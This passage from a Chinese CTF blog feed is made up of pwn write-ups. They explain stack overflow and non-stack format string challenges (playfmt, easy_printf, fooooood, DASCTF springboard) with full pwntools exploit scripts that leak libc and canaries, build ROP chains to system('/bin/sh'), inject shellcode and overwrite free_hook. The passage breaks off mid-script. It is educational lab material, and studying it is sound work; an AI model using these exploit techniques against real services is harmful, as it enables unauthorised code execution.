[rbp-9A0h]</span></span><br><span class="line">  <span class="type">void</span> *v4; <span class="comment">// [rsp+18h] [rbp-998h]</span></span><br><span class="line">  <span class="type">char</span> dest[<span class="number">632</span>]; <span class="comment">// [rsp+730h] [rbp-280h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+9A8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( !a1 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  n = <span class="built_in">strlen</span>(a1) + <span class="number">1</span>;</span><br><span class="line">  v4 = (<span class="type">void</span> *)(*a2)(n);</span><br><span class="line">  <span class="keyword">if</span> ( !v4 )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  <span class="keyword">if</span> ( n &lt;= <span class="number">0xFFF</span> )</span><br><span class="line">    <span class="built_in">memcpy</span>(dest, a1, <span class="number">0x1000</span>uLL);</span><br><span class="line">  <span class="built_in">memcpy</span>(v4, a1, n);</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在这个函数中如果n&lt;0xFFF同时dest只有632的大小，那么就有个栈溢出</p><p>取自ixout学长的exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">p=run()</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Init Data size: \n&#x27;</span>,tbs(<span class="number">120</span>))</span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&#x27;Your Json:\n&#x27;</span>,<span class="string">b&#x27;&#123;&quot;a&quot;:&quot;b&quot;&#125;&#x27;</span>)</span><br><span class="line"></span><br><span class="line">delete(<span class="string">b&#x27;%p%25$p&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc.address=<span class="built_in">int</span>(ru(<span class="string">&#x27;23&#x27;</span>)[-<span class="number">12</span>:],<span class="number">16</span>)-<span class="number">0x1ED723</span></span><br><span class="line">leak(<span class="string">&#x27;libc&#x27;</span>,libc.address)</span><br><span class="line">canary=<span class="built_in">int</span>(ru(<span class="string">&#x27;]&#x27;</span>,drop=<span class="literal">True</span>)[-<span class="number">16</span>:],<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;canary&#x27;</span>,canary)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">pop_rdi_ret=libc.address+<span class="number">0x23b6a</span></span><br><span class="line">ret=libc.address+<span class="number">0x23b6b</span></span><br><span class="line">binsh=<span class="built_in">next</span>(libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>))</span><br><span class="line">system=libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="comment">#dbg(&#x27;b *$rebase(0x15B6)&#x27;)</span></span><br><span class="line">edit(<span class="string">b&#x27;ixout&#x27;</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">632</span>+p64(canary)+p64(<span class="number">0</span>)+p64(pop_rdi_ret)+p64(binsh)+p64(ret)+p64(system))</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><hr><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://ixout.github.io/posts/22716/">https://ixout.github.io/posts/22716/</a></p><p><a href="https://www.ctfiot.com/189832.html">https://www.ctfiot.com/189832.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;比赛的时候全靠fix得分，也是参与上了&lt;/p&gt;
&lt;h1 id=&quot;baby-jit&quot;&gt;&lt;a href=&quot;#baby-jit&quot; class=&quot;headerlink&quot; title=&quot;baby_jit&quot;&gt;&lt;/a&gt;baby_jit&lt;/h1&gt;&lt;figure class=&quot;highlig</summary>
      
    
    
    
    <category term="赛后复盘" scheme="http://s1nec-1o.github.io/categories/%E8%B5%9B%E5%90%8E%E5%A4%8D%E7%9B%98/"/>
    
    
    <category term="traditional pwn" scheme="http://s1nec-1o.github.io/tags/traditional-pwn/"/>
    
  </entry>
  
  <entry>
    <title>谈非栈上格式化字符串</title>
    <link href="http://s1nec-1o.github.io/2024/08/05/%E8%B0%88%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/"/>
    <id>http://s1nec-1o.github.io/2024/08/05/%E8%B0%88%E9%9D%9E%E6%A0%88%E4%B8%8A%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2/</id>
    <published>2024-08-05T03:02:34.000Z</published>
    <updated>2024-08-20T11:12:45.772Z</updated>
    
    <content type="html"><![CDATA[<ul><li><strong>%hhn（写入一字节）</strong></li><li><strong>%hn（写入两字节）</strong></li><li><strong>%n（32位写四字节）</strong></li><li><strong>%ln &#x2F; %lln（写入八字节）</strong></li></ul><h1 id="hitcontraining-playfmt"><a href="#hitcontraining-playfmt" class="headerlink" title="hitcontraining_playfmt"></a>hitcontraining_playfmt</h1><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051105164.png" alt="image-20240729154014016"></p><p>首先是设置输出为无缓冲模式，然后以参数的数量的地址传参</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051105271.png" alt="image-20240729154330774"></p><p>里面调用do_fmt函数，显然是一个非栈上的格式化字符串漏洞</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051106088.png" alt="image-20240729154408434"></p><p>没有保护，且有RWX段，gdb进去可以看到栈便是RWX段，但是没什么软用，因为是非栈上的格式化字符串</p><p>这题是通过在buf段构造shellcode的，因为是老题了，在很old的内核版本的数据段是可执行的，直到5点多才不可执行的</p><p>因此就看一个思路即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.os = <span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :p.send(<span class="built_in">str</span>(data))</span><br><span class="line">sa      = <span class="keyword">lambda</span> delim,data         :p.sendafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :p.sendline(<span class="built_in">str</span>(data))</span><br><span class="line">sla     = <span class="keyword">lambda</span> delim,data         :p.sendlineafter(<span class="built_in">str</span>(delim), <span class="built_in">str</span>(data))</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :p.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> delims, drop=<span class="literal">True</span>  :p.recvuntil(delims, drop)</span><br><span class="line">itr     = <span class="keyword">lambda</span>                    :p.interactive()</span><br><span class="line">uu32    = <span class="keyword">lambda</span> data               :u32(data.ljust(<span class="number">4</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span> data               :u64(data.ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">leak    = <span class="keyword">lambda</span> name,addr          :log.success(<span class="string">&#x27;&#123;&#125; = &#123;:#x&#125;&#x27;</span>.<span class="built_in">format</span>(name, addr))</span><br><span class="line">l64     = <span class="keyword">lambda</span>      :u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">l32     = <span class="keyword">lambda</span>      :u32(p.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>,<span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">context.terminal = [<span class="string">&#x27;gnome-terminal&#x27;</span>,<span class="string">&#x27;-x&#x27;</span>,<span class="string">&#x27;sh&#x27;</span>,<span class="string">&#x27;-c&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">duan</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">x64_32 = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> x64_32:</span><br><span class="line">    context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    context.arch = <span class="string">&#x27;i386&#x27;</span></span><br><span class="line"></span><br><span class="line">p=process(<span class="string">&#x27;./playfmt&#x27;</span>)</span><br><span class="line">buf=<span class="number">0x0804A060</span></span><br><span class="line">pre_ebp=<span class="number">0x080485AD</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#aaaa-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p-%p</span></span><br><span class="line"><span class="comment">#aaaa-0x8048680-0x4-0x8048507-0x8048685-0x804a000-0xffffce98-0x80485ad-0xf7fb5d60-0x804a000-0xffffcea8-0x80485ea-0xffffcec0-(nil)-(nil)-0xf7e1a647-0xf7fb5000-0xf7fb5000-(nil)</span></span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;==\n&#x27;</span>)</span><br><span class="line">sl(<span class="string">&#x27;%6$p&#x27;</span>)</span><br><span class="line">ru(<span class="string">&#x27;0x&#x27;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(r(<span class="number">8</span>),<span class="number">16</span>)-<span class="number">0x28</span>+<span class="number">0x1c</span></span><br><span class="line">leak(<span class="string">&#x27;stack_addr:&#x27;</span>,stack_addr)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(stack_addr &amp; <span class="number">0xffff</span>).encode() + <span class="string">b&#x27;c%6$hn&#x27;</span> </span><br><span class="line">pl = pl.ljust(<span class="number">200</span>,<span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">s(pl)</span><br><span class="line">p.recv()</span><br><span class="line"><span class="comment"># duan()</span></span><br><span class="line"></span><br><span class="line">pl = <span class="string">b&#x27;%&#x27;</span> + <span class="built_in">str</span>(<span class="number">0xa064</span>).encode() + <span class="string">b&#x27;c%10$hn&#x27;</span> </span><br><span class="line">pl = pl.ljust(<span class="number">200</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">s(pl)</span><br><span class="line">p.recv()</span><br><span class="line">duan()</span><br><span class="line"></span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">pl = <span class="string">b&#x27;quit&#x27;</span> + shellcode</span><br><span class="line">s(pl)</span><br><span class="line"></span><br><span class="line">itr()</span><br></pre></td></tr></table></figure><h3 id="思考点"><a href="#思考点" class="headerlink" title="思考点"></a>思考点</h3><ul><li>printf的栈布局受内核版本的影响而不受libc版本的影响</li><li>由于本题没有标志性的输出，导致的exp打得不稳定</li><li>非栈上的格式化字符串漏洞需要两次间接覆盖才可以覆盖返回地址</li></ul><h1 id="easy-printf-64位"><a href="#easy-printf-64位" class="headerlink" title="easy_printf (64位)"></a>easy_printf (64位)</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *s2; <span class="comment">// [rsp+8h] [rbp-78h] BYREF</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">104</span>]; <span class="comment">// [rsp+10h] [rbp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v6; <span class="comment">// [rsp+78h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v6 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Do you know who the best pwner is?&quot;</span>);</span><br><span class="line">  base64_decode(encoded_string, &amp;s2);           <span class="comment">//VG9rYW1laW5FX2lzX3RoZV9iZXN0X3B3bmVy</span></span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0x3C</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(buf, s2) )</span><br><span class="line">    vuln();</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I think your idea is wrong&quot;</span>);</span><br><span class="line">  <span class="built_in">free</span>(s2);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里找一个在线网站解一下base64，然后进入vuln</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Oh,you are right&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to this place&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> fmtstr();</span><br><span class="line">&#125;</span><br><span class="line">__int64 <span class="title function_">fmtstr</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">12</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;What do you want to say?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x40</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br></pre></td></tr></table></figure><p>有13次的printf</p><h3 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h3><p>利用非栈上的格式化字符串来修改free_hook为one_gadget<br>__libc_start_main+240 ：main函数的返回地址</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051106456.png" alt="image-20240805101007065"><br>这个题首先就是运用rbp附近的两个跳板(偏移为8和10)，把_libc_start_main+240改成free_hook<br>这里需要改6位，所以需要4步</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(num)+<span class="string">&#x27;c%8$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(free_hook&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%10$hn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(num+<span class="number">2</span>)+<span class="string">&#x27;c%8$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((free_hook//<span class="number">0x10000</span>)&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span>)</span><br></pre></td></tr></table></figure><p>这里前两步修改就是直接对 _libc_start_main+240 后两位进行了修改<br>后两步是先修改了一下地址，然后修改了 _libc_start_main+240 的倒数3，4位(就是不能直接修改地址的倒数3，4位，我们就修改地址，然后改新地址的最后两位，以达到修改地址的倒数3，4位的目的)</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051106802.png" alt="image-20240805101050623"><br>然后再用跳板把free_hook改为one_gadget<br>free_hook (0x7fde287987a8) 与 one_gadget (0x7fde2841727a) 也是后6位有区别，所以需要多步</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(og&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%29$hn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(num)+<span class="string">&#x27;c%8$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xaa</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>((og//<span class="number">0x10000</span>)&amp;<span class="number">0xffff</span>)+<span class="string">&#x27;c%29$hn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xac</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(free&amp;<span class="number">0xff</span>)+<span class="string">&#x27;c%29$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(<span class="number">0xad</span>)+<span class="string">&#x27;c%10$hhn&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;What do you want to say?\n&#x27;</span>,<span class="string">&#x27;%&#x27;</span>+<span class="built_in">str</span>(free1)+<span class="string">&#x27;c%29$hhn&#x27;</span>)</span><br></pre></td></tr></table></figure><p>第一步是先直接修改free_hook的后四位，第二三步是把 _libc_start_main+240 修改成了 free_hook+2 (free_hook最后两位是0xa8 , 0xa8+0x2&#x3D;0xaa , 这个地址是用libc查找的，所以本地和远程后三位是一致的)，然后再用这种方法修改。</p><p><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202408051106200.png" alt="image-20240805101101694"><br>这里再执行完上面最后一步就可以修改完了，然后执行free函数就直接getshell了。</p><p>由于找不到题目，因此大致看了下思路，也是通过间接覆盖地址</p><h1 id="二进制专项-fooooood-64位"><a href="#二进制专项-fooooood-64位" class="headerlink" title="二进制专项 fooooood (64位)"></a>二进制专项 fooooood (64位)</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-Ch]</span></span><br><span class="line"></span><br><span class="line">  Init();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Have you heard about YANGSHEN?&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;YangShen said that he want to know your name.&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Give me your name:&quot;</span>);</span><br><span class="line">  getstring(name, <span class="number">32</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello %s\n&quot;</span>, name);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">3</span>; i &gt; <span class="number">0</span>; --i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;Now, you have %d times to tell me what is your favourite food!\nwhat&#x27;s your favourite food: &quot;</span>, i);</span><br><span class="line">    getstring(food, <span class="number">32</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You like &quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(food);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;!?\nI like it too!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">unsigned</span> __int64 __fastcall <span class="title function_">getstring</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+14h] [rbp-Ch]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; a2; ++i )                    <span class="comment">// a2=32</span></span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, (i + a1), <span class="number">1uLL</span>);                    <span class="comment">// a1=name  bss</span></span><br><span class="line">    <span class="keyword">if</span> ( *(i + a1) == <span class="number">0xA</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      *(i + a1) = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>三次格式化字符串漏洞</p><p>只有三次的格式化字符串漏洞，而i的值位于栈上，因此先修改格式化字符串漏洞的次数，再覆盖 <code>_libc_start_main+240</code>为 <code>one_gadget</code>即可</p><h1 id="2024DASCTF-springboard"><a href="#2024DASCTF-springboard" class="headerlink" title="2024DASCTF springboard"></a>2024DASCTF springboard</h1><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  ((<span class="built_in">void</span> (__fastcall *)(<span class="type">int</span>, <span class="type">const</span> <span class="type">char</span> **, <span class="type">const</span> <span class="type">char</span> **))myinit)(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Life is not boring, dreams are not out of reach.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Sometimes you just need a springboard.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Then you can see a wider world.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There may be setbacks along the way.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;But keep your love of life alive.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I believe that you will succeed.&quot;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good luck.&quot;</span>);</span><br><span class="line">  <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Here&#x27;s a simple pwn question, challenge yourself.&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You have an 5 chances to get a flag&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;This is the %d time\n&quot;</span>, (<span class="type">unsigned</span> <span class="type">int</span>)(i + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Please enter a keyword&quot;</span>);</span><br><span class="line">    <span class="built_in">read</span>(<span class="number">0</span>, bss, <span class="number">0x40</span>uLL);</span><br><span class="line">    <span class="built_in">printf</span>(bss);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>5次的非栈上printf，是极限情况，改 <code>_libc_start_main+240</code>为<code>one_gadget</code>即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span 